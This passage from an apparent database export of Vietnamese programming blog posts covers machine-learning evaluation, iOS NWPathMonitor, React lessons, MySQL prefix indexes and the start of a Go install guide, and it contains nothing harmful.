hợp với tập dữ liệu có kích thước (rất) nhỏ\n## Tập tối ưu (Validation set)\n### Quá trình học máy (huấn luyện) sẽ được thực hiện gồm 2 giai đoạn:\n- **Giai đoạn 1:** Huấn luyện hệ thống<br>\n- **Giai đoạn 2:** Tối ưu giá trị các tham số của hệ thống<br>\n    * \tTập tối ưu sẽ không có các dữ liệu trùng với tập kiểm thử và tập huấn luyện.\n    * \tTối ưu giúp điều chỉnh tham số và hiệu năng cao hơn\n## Các tiêu chí để đánh giá\n### 1. Tính chính xác (Accuracy)\nMức độ dự đoán (phân lớp) chính xác của hệ thống (đã được huấn luyện) đối với các ví dụ kiểm chứng (test instances)\n### 2. Tính hiệu quả (Efficiency)\nChi phí về thời gian và tài nguyên (bộ nhớ) cần thiết cho việc huấn luyện và kiểm thử hệ thống\n### 3. Khả năng xử lý nhiễu (Robustness)\nKhả năng xử lý (chịu được) của hệ thống đối với các ví dụ nhiễu (lỗi) hoặc thiếu giá trị\n### 4. Khả năng mở rộng (Scalability)\nHiệu năng của hệ thống (vd: tốc độ học/phân loại) thay đổi như thế nào đối với kích thước của tập dữ liệu\n### 5. Khả năng diễn giải (Interpretability)\nMức độ dễ hiểu (đối với người sử dụng) của các kết quả và hoạt động của hệ thống\n### 6. Mức độ phức tạp (Complexity)\nMức độ phức tạp của mô hình hệ thống (hàm mục tiêu) học được\n## Cách tính chính xác\n### 1. Đối với bài toán phân loại\nGiá trị đầu ra của bài toán là một giá trị định danh.\n![](https://images.viblo.asia/7074804b-7b38-4dda-96b8-e382d69dad8d.png)<br>\n*Trong đó:*<br>\n* \t*x*: là một ví dụ trong tập kiểm thử *datatest* \n* \t*o(x)*: giá trị đầu ra (phân lớp) của hệ thống với dữ liệu *x*\n* \t*c(y)*: Phân lớp đúng với ví dụ *x*\n### 2. Đối với bài toán hồi quy (dự đoán)\nGiá trị đầu ra của hệ thống là một giá trị số<br>\n![](https://images.viblo.asia/3eda15a9-5346-4049-a6a8-756ef4e3415b.png)<br>\n*Trong đó:*<br>\n* \t*o(x)* là giá trị đầu ra dự đoán bởi hệ thống với *x*\n* \t*d(x)* là giá trị đúng của dữ liệu *x*	Tập dữ liệu dùng để học máy:\n* \tTập huấn luyện: Được dùng để huấn luyện hệ thống.\n* \tTập tối ưu: Tùy chọn và được dùng để tối ưu các tham số của hệ thống.\n* \tTập kiểm thử: Được dùng để đánh gúa hệ thống đã được huấn luyện.\n\n=> Tập huấn luyện càng lớn(*) thì hiệu năng của hệ thống học càng tốt. <br>\n=> Tập kiểm thử càng lớn thì việc đánh giá càng chính xác. <br>\nRất khó (ít khi) có thể có được c...	{https://images.viblo.asia/7074804b-7b38-4dda-96b8-e382d69dad8d.png,https://images.viblo.asia/3eda15a9-5346-4049-a6a8-756ef4e3415b.png}	1	Đánh giá hiệu năng học máy	{machine-learning,danh-gia-hieu-nang-hoc-may}	0	f	2022-12-18 15:33:38.523+00	2022-12-18 15:33:38.523+00
32021	# NWPathMonitor\nVới iOS 12, Apple giới thiệu tới các nhà phát triển ứng dụng một framework mới có tên Network framework, mà trong đó NWPathMonitor là một sự thay thế hoàn hảo cho Reachability.\n\nNếu là một lập trình viên iOS chắc hẳn bạn không còn lạ lẫm với [Reachability](https://developer.apple.com/library/archive/samplecode/Reachability/Introduction/Intro.html), một trong những sample code kinh điển mà hầu hết chúng ta đều sử dụng trong ứng dụng có kết nối Internet của mình. Ngoài ra, nếu thử tìm kiếm trên trang Cocoapods.org với từ khóa Reachability thì cũng có thể tìm thấy không ít các thư viện tương tự được viết lại với đủ các tùy chọn như ARC support hay Swift support.\n\nTrong sự kiện WWDC tháng 6 năm 2018, một framework mới có tên [Network framework](https://developer.apple.com/videos/play/wwdc2018/715/) được giới thiệu dành cho iOS 12 trở đi. Một đối tượng có tên [NWPathMonitor](https://developer.apple.com/documentation/network/nwpathmonitor)  nằm trong framework này đem đến cho chúng ta một cách chính thống để xác định trạng thái kết nối mạng thay vì phải dùng thư viện của bên thư ba như từ trước tới nay.\n\n# Sử dụng\n\nĐể sử dụng NWPathMonitor chúng ta chỉ cần import Network và sau đó tạo một đối tượng của NWPathMonitor như sau:\n\n```swift\nlet monitor = NWPathMonitor()\n```\n\nNếu chỉ quan tâm đến những thay đổi của một network adapter cụ thể ví dụ như WWifi chẳng hạn, chúng ta có thể khởi tạo bằng phương thức [init(requiredInterfaceType:)](https://developer.apple.com/documentation/network/nwpathmonitor/2998734-init) với tham số truyền vào là một kiểu dữ liệu [NWInterface.InterfaceType](https://developer.apple.com/documentation/network/nwinterface/interfacetype) như sau:\n\n```swift\nlet monitor = NWPathMonitor(requiredInterfaceType: .wifi)\n```\n\nMột số Interface Type mà NWPathMonitor có thể theo dõi được bao gồm:\n* `cellular`\n* `loopback`\n* `other` (Dùng cho virtual hoặc chưa xác định network type)\n* `wifi`\n* `wiredEthernet`\n\nĐể nhận được các thay đổi về network state, chúng ta chỉ cần gán callback cho một thuộc tính có tên `pathUpdateHandler`, callback này sẽ được gọi đến bất cứ khi nào có sự thay đổi đối với network, ví dụ như khi điện thoại chuyển từ sử dụng cellular sang wifi. Trong callback có một giá trị trả về có kiểu NWPath giúp chúng ta có thể dễ dàng xác định được trạng thái đã connectd hay chưa:\n\n```swift\nmonitor.pathUpdateHandler = { path in\n    if path.status == .satisfied {\n        print("Connected")\n    }\n}\n```\n\nViệc chúng ta khởi tạo NWPathMonitor() không có tham số truyền vào hoặc truyền vào tham số InterfaceType sẽ ảnh hưởng đến việc thuộc tính `status` của đối tượng `NWPath` có phải `satisfied` hay `unsatisfied`.  \n\nVí dụ: Khi ta khởi tạo monitor với tham số truyền vào là cellular, nhưng trạng thái của network lại thay đổi thành wifi (khi điện thoại được kết nối đến wifi), thì callback của  `pathUpdateHandler` sẽ không được gọi đến và `status` của NWPath sẽ là `unsatisfied`.  Chúng ta có thể kiểm tra giá trị này bất cứ lúc nào thông qua thuộc tính `currentPath` của `NWPathMonitor`. \n\nVì vậy, nếu chỉ muốn biết liệu device có đang được kết nối Internet hay không, bất kể đó là kết nối Wifi hay Cellular thì tốt nhất là khởi tạo `NWPathMonitor` bằng phương thức không có tham số truyền vào.\n\nĐối tượng `NWPath` có các thuộc tính mà qua đó chúng ta thể dùng để xác định khá nhiều trạng thái của network. Một trong số đó là một thuộc tính khá thú vị mang tên `isExpensive` dùng để xác định xem network hiện tại có được coi là đắt tiền hay không. Chúng ta cũng có thể kiểm tra xem có hỗ trợ DNS, IPv4 hoặc IPv6 hay không. \nNgoài ra nếu muốn xem network trước khi bị thay đổi sang network hiện tại là gì chúng ta có thể sử dụng thuộc tính `usedInterfaceType`.\n\n```swift\nlet isCellular: Bool = path.usesInterfaceType(.cellular)\n```\n\nSử dụng `NWPathMonitor` có một điểm khá tương đồng với cách sử dụng [CLLocationManager](https://developer.apple.com/documentation/corelocation/cllocationmanager) ở chỗ chúng ta cần gọi phương thức `start` để bắt đầu lắng nghe các update và gọi phương thức `stop` khi kết thúc lắng nghe.\n\n```markdown\nlet queue = DispatchQueue.global(qos: .background)\nmonitor.start(queue: queue) \n```\n\nKhi đã hoàn tất quá trình lắng nghe sự thay đổi, chúng ta chỉ cần đơn giản gọi phương thức `cancel()`. Lưu ý rằng một khi đã gọi phương thức `cancel()` chúng ta không thể gọi phương thức` start()` được nữa. Thay vào đó chúng ta cần khởi tạo một biến NWPathMonitor mới.\n\nLưu ý tiếp theo đó là là thuộc tính `currentPath` của `NWPathMonitor` sẽ là `nil` nếu ta truy cập đến nó trước khi phương thức `start` được gọi đến. Trên thực tế nếu chúng ta print biến path được trả về trong callback sau:\n\n```swift\nmonitor.pathUpdateHandler = { path in\n    print(path)\n}\n```\n\nThì kết quả sẽ như sau:\n\n```rust\nOptional(satisfied (Path is satisfied), interface: en0, scoped, ipv4, ipv6, dns)\n```\n\nĐiều này cho thấy giá trị NWPath trả về có kiểu `Optional` mặc dù trong API lại chỉ định nó là `non Optional`, suy ra giá trị NWPath trả về là một con trỏ kiểu Objective-C được bridged sang Swift.\n\n# Vấn đề với Captive Portals\n\nChắc hẳn chúng ta không còn xa lạ với Wifi công cộng trên hồ Gươm, trong bệnh viện, trung tâm thương mại, vv.. thì Captive Portals là một trang web được hiện ra khi chúng ta kết nối đến một Wifi có dạng như vậy, để yêu cầu người dùng phải đăng nhập, hay làm một thao tác gì đó trước khi có thể thực sự  kết nối đến Internet. \n\nĐiều này có thể dẫn đến việc khi điện thoại đang được kết nối đến Wifi dạng này, thì ứng dụng sẽ hoạt động không chính xác thậm chí bi crash - do ứng dụng đang mong muốn trả về JSON từ REST API nhưng thực tế lại nhận được chuỗi HTML từ Captive Portals.\n\nVậy liệu NWPathMonitor có điểm mạnh nào hơn so với Reachability trong việc kiểm tra tình trạng kết nối Internet hay không?\n\nEnum `NWPath.Status` cung cấp ba trường hợp `satisfied`, `unsatisfied`, và `requiresConnection`. \n\nThật không may trong khi tài liệu dành cho developer thì không cho biết các sử dụng của từng trường hợp này, còn nhìn vào framework cũ có tên NetworkExtension, đối tượng NWPathStatus lại còn có thêm một giá trị [`satisfiable`](https://developer.apple.com/documentation/networkextension/nwpathstatus/satisfiable):\n| The path is not currently satisfied, but may become satisfied upon a connection attempt. This can be due to a service, such as a VPN or a cellular data connection not being activated.|\n| -------- | \n\nCó thể giá trị `satisfiable` này tương tự với giá trị `requiresConnection` của Enum `NWPath.Status`.\n\nNhưng may mắn là NWPathMonitor thường chỉ trả về tình trạng mạng là `satisfiable` sau khi người dùng đã thao tác với Captive Portals, nghĩa là sau khi web page được hiển thị và người dùng đã nhấn vào nút xác nhận để kết nối Internet.\n\nTrường hợp không có Captive Portals nào được hiển thị thì sẽ có một Action Sheet hiện ra để người dùng chọn một trong hai lựa chọn: *"Sử dụng mà không có Internet"* hoặc *"Sử dụng một mạng khác"*. \n\nNếu người dùng chọn *"Sử dụng mà không có Internet"* thì trạng thái của NWPath mà NWPathMonitor trả về sẽ là `satisfied` cho dù không có kết nối Internet.\n\n![](https://images.viblo.asia/447c448b-3555-4348-b156-5af45733e967.jpeg)\n\n# Tổng kết\nVậy là chúng ta đã vừa nhìn qua về NWPathMonitor, một đối tượng nằm trong Network framework được giới thiệu cùng với iOS 12. Sau đây là một số điểm mạnh và điểm yếu:\n\n### Điểm mạnh\n\n* Được hỗ trợ và phát hành chính chủ Apple\n* Không cần phải import code của bên thứ ba như trước đây, chỉ cần `import Network.framework` trên iOS 12\n* Trả về status của NWPath là `satisfied` sau khi người dùng kết nối với captive portal.\n\n### Điểm yếu\n\n* Chỉ hỗ trợ iOS 12 trở đi, có nghĩa là với những iOS thấp hơn chúng ta vẫn phải sử dụng các phương thức cũ.\n* Tài liệu chưa đầy đủ, có thể xem ở đây để biết thêm chi tiết https://developer.apple.com/documentation/network/nwpathmonitor\n* Không thể xác định được khi người dùng kết nối đến captive portal.	NWPathMonitor\nVới iOS 12, Apple giới thiệu tới các nhà phát triển ứng dụng một framework mới có tên Network framework, mà trong đó NWPathMonitor là một sự thay thế hoàn hảo cho Reachability.\n\nNếu là một lập trình viên iOS chắc hẳn bạn không còn lạ lẫm với Reachability, một trong những sample code kinh điển mà hầu hết chúng ta đều sử dụng trong ứng dụng có kết nối Internet của mình. Ngoài ra, nế...	{https://images.viblo.asia/447c448b-3555-4348-b156-5af45733e967.jpeg}	1	iOS 12 Netwok Access: Sắp đến lúc xóa bỏ Reachability khỏi project	{ios-12,internet,ios,reachability}	0	f	2022-12-18 15:33:37.826+00	2022-12-18 15:33:37.826+00
31611	![](https://images.viblo.asia/94f8c227-5ac8-4ad0-a353-3394469b2ea1.png)\n\n*Không, tôi đã không viết nó, nhưng tôi biết nó thu hút sự chú ý của bạn*\n\n\nBắt đầu với một công nghệ mới có thể khá rắc rối. Bạn thường thấy mình trong một biển các bài hướng dẫn và bài viết, theo sau là hàng triệu ý kiến cá nhân. Và mọi người đều tuyên bố rằng họ đã tìm thấy cách **đúng và hoàn hảo**.\n\n\nĐiều này khiến chúng ta tranh luận về việc liệu hướng dẫn được chọn của chúng ta sẽ lãng phí thời gian hay không.\n\nTrước khi lặn xuống đại dương, chúng ta phải hiểu các khái niệm cơ bản của một công nghệ. Sau đó, chúng ta cần phát triển một tư duy dựa trên công nghệ. Nếu chúng ta bắt đầu học React, trước tiên chúng ta phải nghĩ về React. Chỉ sau này chúng ta mới có thể bắt đầu trộn nhiều suy nghĩ khác nhau thành một.\n\nTrong bài viết này, chúng tôi sẽ đề cập đến một số bài học tôi học được về tư duy này từ những trải nghiệm cá nhân của tôi với React. Chúng tôi sẽ trải qua những ngày làm việc ngày đêm với các dự án cá nhân và thậm chí cả bài nói chuyện tôi đã đưa ra tại một sự kiện JavaScript địa phương.\n\nSo let’s go!\n\n### React đang phát triển, nên bạn phải cập nhật thường xuyên\n\nNếu bạn nhớ thông báo ban đầu của phiên bản 16.3.0, bạn sẽ nhớ mọi người đã phấn khích như thế nào.\n\nDưới đây là một số thay đổi và cải tiến mà chúng tôi đã nhận được:\n\n- Official Context API\n- createRef API\n- forwardRef API\n- StrictMode\n- Component Lifecycle Changes\n\n\nTeam React Core và tất cả những người đóng góp đang làm rất tốt khi cố gắng cải thiện công nghệ mà tất cả chúng ta đều ngưỡng mộ. Và trong phiên bản 16.4.0, chúng tôi đã nhận được [Pointer Events](https://reactjs.org/blog/2018/05/23/react-v-16-4.html) .\n\nNhững thay đổi tiếp theo chắc chắn sẽ đến và đó chỉ là vấn đề thời gian: Async Rendering, Caching, version 17.0.0 và nhiều thứ khác chưa được biết đến.\n\nVì vậy, nếu bạn muốn đứng đầu, bạn phải cập nhật những điều đang diễn ra trong cộng đồng.\n\nBiết cách mọi thứ hoạt động và tại sao chúng đang được phát triển. Tìm hiểu những vấn đề đang được giải quyết và làm thế nào phát triển được thực hiện dễ dàng hơn. Nó thực sự sẽ giúp bạn rất nhiều.\n\n### Don’t be afraid to split your code into smaller chucks\n\n\nReact là dựa trên component. Vì vậy, bạn nên tận dụng khái niệm này và không ngại chia những phần lớn hơn thành những phần nhỏ hơn.\n\nĐôi khi một thành phần đơn giản có thể được tạo từ 4-5 dòng code, và trong một số trường hợp, nó hoàn toàn OK.\n\nLàm cho nó để nếu một người mới nhảy vào, họ sẽ không cần nhiều ngày để hiểu mọi thứ hoạt động như thế nào.\n\n```\n// isn't this easy to understand?\nreturn (\n  [\n   <ChangeButton\n    onClick={this.changeUserApprovalStatus}\n    text="Let’s switch it!"\n   />,\n   <UserInformation status={status}/> \n  ]\n);\n```\n\nBạn không cần phải tạo các components mà tất cả đều có tích hợp logic phức tạp. Chúng có thể chỉ là hình ảnh. Nếu điều này cải thiện khả năng đọc và kiểm tra code, và giảm code hơn nữa, đó là một điều tuyệt vời cho mọi người trong team.\n\n```\nimport ErrorMessage from './ErrorMessage';\nconst NotFound = () => (\n  <ErrorMessage\n    title="Oops! Page not found."\n    message="The page you are looking for does not exist!"\n    className="test_404-page"\n  />\n);\n```\n\nTrong ví dụ trên, các properties  là tĩnh. Vì vậy, chúng ta có thể có một component thuần túy chịu trách nhiệm về thông báo lỗi của trang web `Not Found` và không có gì nữa.\n\nNgoài ra, nếu bạn không thích có các class CSS làm tên class ở mọi nơi, tôi khuyên bạn nên sử dụng các component styled. Điều này có thể cải thiện khả năng đọc khá nhiều.\n\n```\nconst Number = styled.h1`\n  font-size: 36px;\n  line-height: 40px;\n  margin-right: 5px;\n  padding: 0px;\n`;\n//..\n<Container>\n  <Number>{skipRatePre}</Number>\n  <InfoName>Skip Rate</InfoName>\n</Container>\n```\n\nNếu bạn sợ tạo thêm các component vì làm rối thư mục dự án của bạn với các file, hãy suy nghĩ lại về cách tổ chức code của bạn. Tôi đã sử dụng [cấu trúc fractal](https://hackernoon.com/fractal-a-react-app-structure-for-infinite-scale-4dab943092af) và nó thật tuyệt vời.\n\n\n### Don’t stick to the basics — become advanced\n\nĐôi khi bạn có thể nghĩ rằng bạn không hiểu điều gì đó đủ để chuyển sang những thứ tiên tiến. Nhưng thường thì bạn không nên lo lắng về nó quá nhiều - hãy vượt qua thử thách và chứng minh rằng mình đã sai.\n\nBằng cách tiếp nhận các chủ đề nâng cao và thúc đẩy bản thân, bạn có thể hiểu thêm về những điều cơ bản và cách chúng được sử dụng cho những điều lớn hơn.\n\nCó rất nhiều patterns mà bạn muốn khám phá:\n\n-Compound Components\n- High Order Components\n- Render Props\n- Smart/Dumb Components\n- many others (try out Profiling)\n\nKhám phá, tìm hiểu tất cả chúng, và bạn sẽ biết tại sao và nơi chúng được sử dụng. Bạn sẽ trở nên thoải mái hơn với React.\n\n```\n// looks like magic?\n// it's not that hard when you just try\nrender() {\n  const children = React.Children.map(this.props.children,\n   (child, index) => {\n      return React.cloneElement(child, {\n        onSelect: () => this.props.onTabSelect(index)\n    });    \n });  \n return children;\n}\n```\n\nNgoài ra, đừng ngại thử một cái gì đó mới trong công việc của bạn - tất nhiên là trong giới hạn nhất định! Đừng chỉ thử nghiệm trên các dự án cá nhân.\n\nMọi người sẽ đặt câu hỏi, và đó là bình thường. Nhiệm vụ của bạn là bảo vệ công việc và quyết định của mình bằng những lập luận mạnh mẽ.\n\nMục tiêu của bạn là để giải quyết một vấn đề hiện có, làm cho sự phát triển dễ dàng hơn hoặc chỉ cần làm clean code. Ngay cả khi đề xuất của bạn bị từ chối, bạn sẽ biết nhiều hơn là ngồi im lặng.\n\n### Don’t over-complicate things\n\nĐiều này có vẻ giống như một đối số, nhưng nó khác nhau. Trong cuộc sống, và ở mọi nơi, chúng ta phải có sự cân bằng. Chúng ta không nên quá cầu toàn để thể hiện. Chúng ta phải thực tế. Viết code dễ hiểu và hoàn thành mục đích của nó.\n\nNếu bạn không cần Redux, nhưng bạn muốn sử dụng nó vì mọi người đều sử dụng mà không biết mục đích thực sự của mình. Hãy có ý kiến và đừng ngại phản biện nếu người khác thúc ép bạn.\n\nĐôi khi bạn có thể nghĩ rằng bằng cách tận dụng các công nghệ mới nhất và viết mã phức tạp mà bạn đang nói với thế giới: \n“I’m not a junior, I am becoming a mid/senior. Look what can I do!”\n\nThực sự, đó là suy nghĩ của tôi khi bắt đầu hành trình phát triển của mình. Nhưng theo thời gian, bạn hiểu rằng code được viết mà không hiển thị hoặc bởi vì nó chạy rất dễ dàng.\n\n- Đồng nghiệp có thể làm việc trong các dự án của bạn và bạn không phải là người duy nhất chịu trách nhiệm developing / fixing / testing `insert task`.\n- Team có thể hiểu những gì người khác đã làm mà không cần ngồi qua một cuộc họp dài. Một vài phút là đủ để thảo luận.\n- Khi đồng nghiệp của bạn đi nghỉ hai tuần, bạn có thể đảm nhận nhiệm vụ của họ. Và bạn sẽ không phải làm việc với nó trong 8 giờ, bởi vì nó có thể được thực hiện trong một giờ.\n\nMọi người tôn trọng những người làm cho cuộc sống của người khác dễ dàng hơn. Do đó, nếu mục tiêu của bạn là giành được sự tôn trọng, tăng thứ hạng và cải thiện, hãy nhắm đến code cho nhóm chứ không phải cho chính bạn.\n\nBạn sẽ trở thành tất cả mọi người.\n\n### Refactor, refactor and refactor — it’s normal\n\nBạn sẽ thay đổi suy nghĩ nhiều lần, mặc dù người PM sẽ thay đổi chúng thường xuyên hơn. Những người khác sẽ chỉ trích công việc của bạn, và bạn sẽ chỉ trích nó. Do đó, bạn sẽ phải thay đổi code của mình nhiều lần.\n\nNhưng đừng lo lắng, đó là một quá trình học tập tự nhiên. Không có sai lầm và lỗi, chúng ta không thể trở nên tốt hơn.\n\nCàng nhiều lần chúng ta ngã xuống, chúng ta càng dễ dàng trở lại.\n\nNhưng đây là một gợi ý: đảm bảo bạn kiểm tra phần mềm hiện tại của mình. Smoke, unit, integration, snapshot — don’t be shy of them.\n\nMọi người đều phải đối mặt hoặc sẽ đối mặt với một scenario khi một bài test có thể tiết kiệm thời gian quý báu.\n\nVà nếu bạn, giống như nhiều người, nghĩ rằng họ là một sự lãng phí thời gian, chỉ cần thử suy nghĩ một chút khác biệt.\n\n- Bạn sẽ không phải ngồi với đồng nghiệp của mình để giải thích cách mọi thứ hoạt động.\n- Bạn sẽ không phải ngồi với đồng nghiệp giải thích lý do tại sao mọi thứ bị phá vỡ.\n- Bạn sẽ không phải sửa lỗi cho đồng nghiệp của mình.\n- Bạn sẽ không phải sửa các lỗi được tìm thấy sau 3 tuần.\n- Bạn sẽ có thời gian để làm những thứ bạn muốn.\n\n\nVà đó là những lợi ích khá lớn.\n\n### If you love it, you’ll thrive\n\nTrong năm trước, mục tiêu của tôi là trở nên tốt hơn với React. Tôi muốn nói về nó. Tôi muốn người khác thích nó với tôi.\n\nTôi có thể ngồi suốt đêm code không ngừng, xem nhiều cuộc nói chuyện khác nhau và tận hưởng từng phút của nó.\n\nVấn đề là, nếu bạn muốn một cái gì đó, bằng cách nào đó mọi người sẽ bắt đầu giúp bạn. Và tháng trước, lần đầu tiên tôi đã nói về React với đám đông 200 người.\n\nTrong khoảng thời gian này, tôi trở nên mạnh mẽ và thoải mái hơn với React - các mô hình(patterns), dạng thức (paradigms) và hoạt động bên trong khác nhau. Tôi có thể có các cuộc thảo luận nâng cao và dạy cho những người khác về các chủ đề mà tôi sợ không muốn làm.\n\nVà hôm nay tôi vẫn cảm thấy phấn khích và thích thú như tôi đã cảm thấy một năm trước.\n\nDo đó tôi muốn khuyên mọi người nên tự hỏi: *Bạn có thích những gì bạn làm không?*\n\nNếu không, hãy tiếp tục tìm kiếm mảnh ghép đặc biệt mà bạn có thể nói trong nhiều giờ, tìm hiểu về nó mỗi tối và trở lên hạnh phúc.\n\nBởi vì chúng ta phải tìm một thứ gì đó gần với trái tim mình nhất. Thành công không thể bị ép buộc, nó phải đạt được.\n\nNếu tôi có thể quay ngược thời gian một năm, đây là những gì tôi sẽ nói với bản thân mình để chuẩn bị trước hành trình lớn sắp tới.\n\nCảm ơn bạn đã đọc!\n\nNếu bạn thấy bài viết này hữu ích,. 👏👏👏.\n\nTham khảo: https://medium.com/free-code-camp/mindset-lessons-from-a-year-with-react-1de862421981	![](https://images.viblo.asia/94f8c227-5ac8-4ad0-a353-3394469b2ea1.png)\n\n\n\nKhông, tôi đã không viết nó, nhưng tôi biết nó thu hút sự chú ý của bạn\n\nBắt đầu với một công nghệ mới có thể khá rắc rối. Bạn thường thấy mình trong một biển các bài hướng dẫn và bài viết, theo sau là hàng triệu ý kiến cá nhân. Và mọi người đều tuyên bố rằng họ đã tìm thấy cách đúng và hoàn hảo.\n\nĐiều này khiến chúng ta tranh luận về việc liệu hướng dẫn được chọn của chúng ta sẽ lãng phí thờ...	{https://images.viblo.asia/94f8c227-5ac8-4ad0-a353-3394469b2ea1.png}	1	Những bài học quan trọng nhất tôi đã học được sau một năm làm việc với React	{reactjs}	0	f	2022-12-18 15:33:37.853+00	2022-12-18 15:33:37.853+00
32016	# Index Selecitivity\nNếu bạn là người hay làm về index, sẽ có những trường hợp các bạn cần phải đánh index cho 1 cột chuỗi kí tự rất dài. Việc này sẽ khiến cho index của bạn trở nên rất lớn và chậm. Bạn có thể đánh index dựa trên vài kí tự đầu thay vì cả cụm kí tự ban đầu.  Điều này làm cho các index của bạn sử dụng ít không gian hơn, nhưng nó cũng làm cho chúng ít chọn lọc.  **Index selecivity** là tỷ lệ của số lượng giá trị được lập chỉ mục riêng biệt (số lượng thẻ) cho tổng số hàng trong bảng (#T) và nằm trong khoảng từ 1 / #T đến1. Một index có tính chọn lọc cao là tốt vì nó cho phép MySQL lọc ra nhiều hàng hơn khi nó tìm kiếm các trận đấu Một chỉ mục duy nhất có độ chọn lọc là 1, tốt như nó có được. Nếu bạn đánh index cho **BLOB**, **TEXT**, hoặc một cột **VARCHAR** dài bạn buộc phải sử dụng prefix index vì MYSQL không cho phép đánh index toàn bộ độ dài.\n# Prefix Indexes\nChúng ta có 1 mẹo nhỏ là chọn một prefix đủ dài để cung cấp tính chọn lọc tốt, nhưng ngắn đủ để tiết kiệm không gian. Prefix phải đủ dài để làm cho chỉ mục gần như hữu ích vì nó sẽ được lập index cho toàn bộ cột. Trong bài viết này tôi sử dụng cơ sở dữ liệu Sakila để minh họa cho bài toán cần giải quyết. Bạn có thể tìm hiểu về cách cài đặt, cách sử dụng cơ sở dữ liệu [tại đây ](https://downloads.mysql.com/docs/sakila-en.pdf)\n\nTrong sakila, không có bảng nào đủ dài để chúng ta minh họa cách giải quyết bài toán nên đầu tiên chúng ta sẽ tạo ra 1 bảng **city_demo** mới từ bảng **city** có sẵn trong sakila.\n```\nCREATE TABLE sakila.city_demo(city VARCHAR(50) NOT NULL);\nINSERT INTO sakila.city_demo(city) SELECT city FROM sakila.city;\n-- Lăp lại câu lệnh này 5 lần\nINSERT INTO sakila.city_demo(city) SELECT city FROM sakila.city_demo;\n--Bây giờ chúng ta sẽ random lại phân bố của các record\nUPDATE sakila.city_demo\nSET city = (SELECT city FROM sakila.city ORDER BY RAND() LIMIT 1);\n```\n\nĐầu tiên chúng ta sẽ tìm các thành phố xuất hiện nhiều nhất:\n```\nSELECT COUNT(*) AS cnt, city\nFROM sakila.city_demo GROUP BY city ORDER BY cnt DESC LIMIT 10;\n```\nTa có 1 bảng kết quả\n![](https://images.viblo.asia/8ebc30a4-4121-41ba-af1f-36270377adf9.png)\n\nBây giờ chúng ta sẽ tìm các prefix xuất hiện nhiều nhất, bắt đầu với prefix có độ dài là 3.\n```\nSELECT COUNT(*) AS cnt, LEFT(city, 3) AS pref\nFROM sakila.city_demo GROUP BY pref ORDER BY cnt DESC LIMIT 10;\n```\n\nTa nhận được kết quả như sau:\n![](https://images.viblo.asia/f1793757-3a7a-4dea-8ceb-f9b83ca2362d.png)\n\nChúng ta có thể dễ dàng thấy được có rất nhiều sự xuất hiện của một prefix. Chúng ta cần phải tăng độ dài của prefix đến khi prefix có độ chọn lọc gần bằng với độ chọn lọc của cột. Chúng ta thử 1 giá trị khác chẳng hạn là 7.\n```\nSELECT COUNT(*) AS cnt, LEFT(city, 7) AS pref\nFROM sakila.city_demo GROUP BY pref ORDER BY cnt DESC LIMIT 10;\n```\nTa nhận được kết quả:\n![](https://images.viblo.asia/4282439a-c2c3-4080-94df-1753da531112.png)\n\nMột cách khác để tính độ dài một prefix là đủ tốt bằng việc chúng ta sẽ tính ra độ chọn lọc của cột và chúng ta sẽ tính toàn để độ chọn lọc của prefix gần nhất với giá trị này. Cách để tính độ chọn lọc của cột.\n```\nSELECT COUNT(DISTINCT city)/COUNT(*) FROM sakila.city_demo;\n```\nChúng ta có kết quả:\n![](https://images.viblo.asia/e22e7e4e-02c4-42b4-9953-8907ee07b266.png)\nChúng ta sẽ tính độ chọn lọc các prefix có độ dài từ 3 đến 7 đễ xem kết quả\n```\nSELECT COUNT(DISTINCT LEFT(city, 3))/COUNT(*) AS sel3,\nCOUNT(DISTINCT LEFT(city, 4))/COUNT(*) AS sel4,\nCOUNT(DISTINCT LEFT(city, 5))/COUNT(*) AS sel5,\nCOUNT(DISTINCT LEFT(city, 6))/COUNT(*) AS sel6,\nCOUNT(DISTINCT LEFT(city, 7))/COUNT(*) AS sel7\nFROM sakila.city_demo;\n```\nTa nhận được kết quả như sau:\n![](https://images.viblo.asia/e32402d4-dad3-4130-bcaa-bbaf1b8be6e4.png)\nChúng ta có thể thấy từ kết quả trên, 7 là 1 length phù hợp cho bài toán. Bây giờ chúng ta sẽ tạo prefix index trên cột đó:\n```\nALTER TABLE sakila.city_demo ADD KEY (city(7));\n```\nLưu ý, prefix indexes là một cách tốt để index nhỏ và nhanh hơn nhưng chúng cũng có nhược điểm là MySQL không thể sử dụng chúng cho câu truy vấn **ORDER BY** hoặc **GROUP** .\n\n# Tài liệu tham khảo\nhttps://www.highperfmysql.com/	Index Selecitivity\nNếu bạn là người hay làm về index, sẽ có những trường hợp các bạn cần phải đánh index cho 1 cột chuỗi kí tự rất dài. Việc này sẽ khiến cho index của bạn trở nên rất lớn và chậm. Bạn có thể đánh index dựa trên vài kí tự đầu thay vì cả cụm kí tự ban đầu.  Điều này làm cho các index của bạn sử dụng ít không gian hơn, nhưng nó cũng làm cho chúng ít chọn lọc.  Index selecivity là ...	{https://images.viblo.asia/8ebc30a4-4121-41ba-af1f-36270377adf9.png,https://images.viblo.asia/f1793757-3a7a-4dea-8ceb-f9b83ca2362d.png,https://images.viblo.asia/4282439a-c2c3-4080-94df-1753da531112.png,https://images.viblo.asia/e22e7e4e-02c4-42b4-9953-8907ee07b266.png,https://images.viblo.asia/e32402d4-dad3-4130-bcaa-bbaf1b8be6e4.png}	1	Prefix Indexes và Index Selectivity	{database-index,mysql}	0	f	2022-12-18 15:33:37.879+00	2022-12-18 15:33:37.879+00
31930	# Go là gì?\n![](https://cdn-images-1.medium.com/max/800/1*30aoNxlSnaYrLhBT0O1lzw.png)\n**Go** hay **Golang** là một ngôn ngữ lập trình, được bắt nguồn từ Google. Hiện nay ngôn ngữ lập trình này được open source và maintain bởi các kĩ sư lập trình của Google. Ban đầu, bộ compliter của Go được viết bằng ngôn ngữ C nhưng sau nhiều phiên bản, bộ compiler giờ đã được viết lại hoàn chỉnh bằng chính Go.\n\n# Những đặc điểm chính của Go\n* Go là ngôn ngữ statically typed.\n* Go có sẵn một bộ Garbage collection và Memory safety.\n* Chuỗi kí tự trong Go đều được mặc định encode về UTF-8.\n* Có cú pháp cực kì đơn giản.\n\n# Hướng dẫn cài đặt\n\n1. **Linux**\n\nBạn tải phiên bản dành cho Linux tại địa chỉ: [https://golang.org/dl/](https://golang.org/dl/). Sau đó ta sử dụng command sau để giải nén thư mục /usr/local\n> sudo tar -C /usr/local -xzf go$VERSION.$OS-$ARCH.tar.gz\n> \nSau đo ta cần thêm biến */usr/local/go/bin* vào biến môi trường PATH. Bạn có thểm bằng cách sử dụng những câu lệnh này vào trong file *.bashrc*\n```\n$ echo "export 